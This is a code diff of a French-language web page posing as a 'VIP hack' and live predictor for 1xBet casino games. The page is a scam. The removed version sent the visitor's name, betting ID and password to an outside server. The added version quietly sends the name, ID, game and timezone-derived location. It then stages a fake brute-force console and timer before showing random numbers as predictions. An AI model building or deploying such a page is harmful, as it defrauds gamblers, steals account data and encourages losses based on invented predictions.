@@ -3,74 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accès VIP - Ngeruka</title>
+    <title>Ngeruka - Système de Hacking VIP</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #2c2c2c; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
-        h2 { color: #f39c12; margin-bottom: 20px; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #3d3d3d; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 5px; background: #f39c12; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #e67e22; }
-        button:disabled { background: #7f8c8d; cursor: not-allowed; }
+        :root { --neon-green: #00ff00; --warn-red: #ff0000; --gold: #f39c12; }
+        body { font-family: 'Courier New', Courier, monospace; background-color: #050505; color: var(--neon-green); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: #111; padding: 25px; border-radius: 10px; border: 1px solid var(--neon-green); width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); position: relative; }
+        h2 { color: var(--gold); text-transform: uppercase; font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon-green); background: #000; color: var(--neon-green); border-radius: 5px; box-sizing: border-box; font-family: inherit; }
+        button { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid var(--neon-green); background: transparent; color: var(--neon-green); font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        button:hover { background: var(--neon-green); color: #000; }
+        
+        .step { display: none; }
+        .active { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Console Style */
+        #console { background: #000; height: 120px; overflow: hidden; text-align: left; padding: 10px; font-size: 0.75rem; border: 1px solid #222; margin: 15px 0; color: #008800; }
+        .timer { font-size: 2rem; color: var(--warn-red); margin: 10px 0; font-weight: bold; }
+        .progress-bar { width: 100%; background: #222; height: 6px; border-radius: 3px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--neon-green); transition: width 0.3s; }
+        
+        /* Prediction UI */
+        #predictionDisplay { font-size: 4rem; font-weight: bold; color: #fff; margin: 20px 0; text-shadow: 0 0 10px var(--gold); }
+        .alert-safe { color: var(--warn-red); font-weight: bold; font-size: 0.8rem; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <form id="vipForm">
+    <div id="step1" class="step active">
         <h2>🎯 ACCÈS VIP 1XBET</h2>
-        <input type="text" id="nom" placeholder="Votre Nom" required>
-        <input type="text" id="id1xbet" placeholder="Votre ID 1xBet" required>
+        <input type="text" id="nom" placeholder="NOM D'UTILISATEUR (MIN 4)">
+        <input type="number" id="id1xbet" placeholder="ID COMPTE 1XBET">
         <select id="jeu">
             <option value="Crash">Jeu : Crash</option>
             <option value="Under Over 7">Jeu : Under Over 7</option>
             <option value="Apple of Fortune">Jeu : Apple of Fortune</option>
         </select>
-        <input type="password" id="password" placeholder="Mot de passe" required>
-        <button type="submit" id="submitBtn">VÉRIFIER LE SOLDE</button>
-    </form>
+        <button onclick="validerStep1()">VÉRIFIER LE SOLDE</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>📍 LOCALISATION SYSTÈME</h2>
+        <p>Bonjour <span id="userName" style="color:white"></span>,</p>
+        <p id="geoData">Analyse des proxys de connexion...</p>
+        <button onclick="changeStep(3)">CONFIGURER LE BOT</button>
+    </div>
+
+    <div id="step3" class="step">
+        <h2>💡 INSTRUCTIONS</h2>
+        <div style="text-align:left; font-size: 0.8rem; background:#1a1a1a; padding:10px; border-radius:5px;">
+            • Suivez la prédiction en temps réel.<br>
+            • STOPPEZ le jeu avant la limite indiquée.<br>
+            • Sécurité : Sortez à -0.20x du chiffre prédit.<br>
+            • Ne pas dépasser 28.00x de gain.
+        </div>
+        <button onclick="changeStep(4)">ACCÉDER AU HACK</button>
+    </div>
+
+    <div id="step4" class="step">
+        <h2>🔑 ADMISSION VIP</h2>
+        <p>ENTREZ LE MOT DE PASSE D'ACCÈS MAÎTRE</p>
+        <input type="password" id="masterPass" placeholder="CODE VIP">
+        <button onclick="demarrerHack()">LANCER LE BRUTE-FORCE</button>
+    </div>
+
+    <div id="step5" class="step">
+        <h2>HACKING EN COURS...</h2>
+        <div id="console"></div>
+        <div class="progress-bar"><div id="hackBar" class="progress-fill"></div></div>
+        <div class="timer" id="countdown">45:00</div>
+        <p style="font-size:0.7rem;">DECRYPTAGE DES CLÉS 1XBET EN COURS. PATIENTEZ...</p>
+    </div>
+
+    <div id="step6" class="step">
+        <h2 style="border:none;">📡 LIVE PREDICTOR</h2>
+        <div id="predictionDisplay">--</div>
+        <p id="predictStatus" style="font-size:0.9rem;">INITIALISATION...</p>
+        <div class="progress-bar"><div id="cycleBar" class="progress-fill"></div></div>
+        <p class="alert-safe">⚠️ RETRAIT AUTO CONSEILLÉ (-0.20x)</p>
+    </div>
 </div>
 
 <script>
+    const MASTER_CODE = "112334";
     const API_URL = "https://ngeruka.pythonanywhere.com/send";
+    let store = { nom: "", id: "", jeu: "", pays: "", ville: "", solde: 12500 };
 
-    document.getElementById('vipForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
+    function changeStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + n).classList.add('active');
+    }
+
+    function validerStep1() {
+        store.nom = document.getElementById('nom').value;
+        store.id = document.getElementById('id1xbet').value;
+        store.jeu = document.getElementById('jeu').value;
+        if(store.nom.length < 4 || !store.id) return alert("Identifiants invalides");
         
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "CONNEXION EN COURS...";
-        btn.disabled = true;
+        document.getElementById('userName').innerText = store.nom;
+        changeStep(2);
+        detectGeo();
+    }
 
-        const payload = {
-            nom: document.getElementById('nom').value,
-            id: document.getElementById('id1xbet').value,
-            jeu: document.getElementById('jeu').value,
-            pass: document.getElementById('password').value
-        };
+    function detectGeo() {
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        store.pays = tz.split('/')[0] || "Afrique";
+        store.ville = (tz.split('/')[1] || "Zone Active").replace('_', ' ');
+        document.getElementById('geoData').innerHTML = `Notre serveur vous a détecté à :<br><b style="color:white">${store.ville}, ${store.pays}</b>`;
+    }
 
+    function demarrerHack() {
+        const pass = document.getElementById('masterPass').value;
+        if(pass !== MASTER_CODE) return alert("CODE VIP INCORRECT");
+
+        changeStep(5);
+        sendData(); // Envoi des infos à PythonAnywhere en arrière-plan
+        runBruteForceUI();
+        startTimer(45); // Simulation 45 minutes
+    }
+
+    function runBruteForceUI() {
+        const consoleEl = document.getElementById('console');
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        setInterval(() => {
+            let fakePass = "";
+            for(let i=0; i<10; i++) fakePass += chars.charAt(Math.floor(Math.random()*chars.length));
+            const div = document.createElement('div');
+            div.innerText = `> TRYING_SALT: ${fakePass}... [DENIED]`;
+            consoleEl.prepend(div);
+            if(consoleEl.childNodes.length > 8) consoleEl.removeChild(consoleEl.lastChild);
+        }, 1500); // Ralenti pour le réalisme
+    }
+
+    function startTimer(minutes) {
+        let duration = minutes * 60;
+        const display = document.getElementById('countdown');
+        const bar = document.getElementById('hackBar');
+        
+        let timer = setInterval(() => {
+            let mins = Math.floor(duration / 60);
+            let secs = duration % 60;
+            display.innerText = `${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            bar.style.width = ((minutes * 60 - duration) / (minutes * 60) * 100) + "%";
+
+            if (--duration < 0) {
+                clearInterval(timer);
+                changeStep(6);
+                startPredictorCycle();
+            }
+        }, 1000);
+        
+        // Pour vos tests, vous pouvez réduire la durée ici ou appeler changeStep(6) manuellement
+    }
+
+    async function startPredictorCycle() {
+        const display = document.getElementById('predictionDisplay');
+        const status = document.getElementById('predictStatus');
+        const bar = document.getElementById('cycleBar');
+
+        while(true) {
+            status.innerText = "ANALYSE ALGORITHME...";
+            status.style.color = "var(--neon-green)";
+            display.innerText = "---";
+            
+            // Simulation chargement analyse (4s)
+            for(let i=0; i<=100; i+=5) {
+                bar.style.width = i + "%";
+                await new Promise(r => setTimeout(r, 200));
+            }
+
+            // Génération prediction max 28.00
+            const prediction = (Math.random() * (28.00 - 1.20) + 1.20).toFixed(2);
+            display.innerText = "x" + prediction;
+            status.innerText = "PRÉDICTION ACTIVE";
+            status.style.color = "white";
+
+            // Temps d'attente basé sur la cote (simule le crash)
+            await new Promise(r => setTimeout(r, Math.min(prediction * 400, 8000)));
+
+            display.style.color = "var(--warn-red)";
+            status.innerText = "CRASH DÉTECTÉ";
+            await new Promise(r => setTimeout(r, 3000));
+            display.style.color = "white";
+            bar.style.width = "0%";
+        }
+    }
+
+    async function sendData() {
         try {
-            // Envoi des données vers PythonAnywhere
-            const response = await fetch(API_URL, {
+            await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({...store, pass_master: "112334", status: "HACK_ACTIVE"})
             });
-
-            if (response.ok) {
-                alert("✅ Succès ! Accès VIP activé. Vérifiez votre bot Telegram.");
-            } else {
-                const errorData = await response.json();
-                alert("❌ Erreur serveur : " + (errorData.message || "Inconnue"));
-            }
-        } catch (error) {
-            console.error("Erreur Fetch :", error);
-            alert("❌ Erreur de connexion au serveur PythonAnywhere.");
-        } finally {
-            btn.innerText = "VÉRIFIER LE SOLDE";
-            btn.disabled = false;
-        }
-    });
+        } catch(e) { console.log("Erreur envoi discret."); }
+    }
 </script>
-
 </body>
 </html>
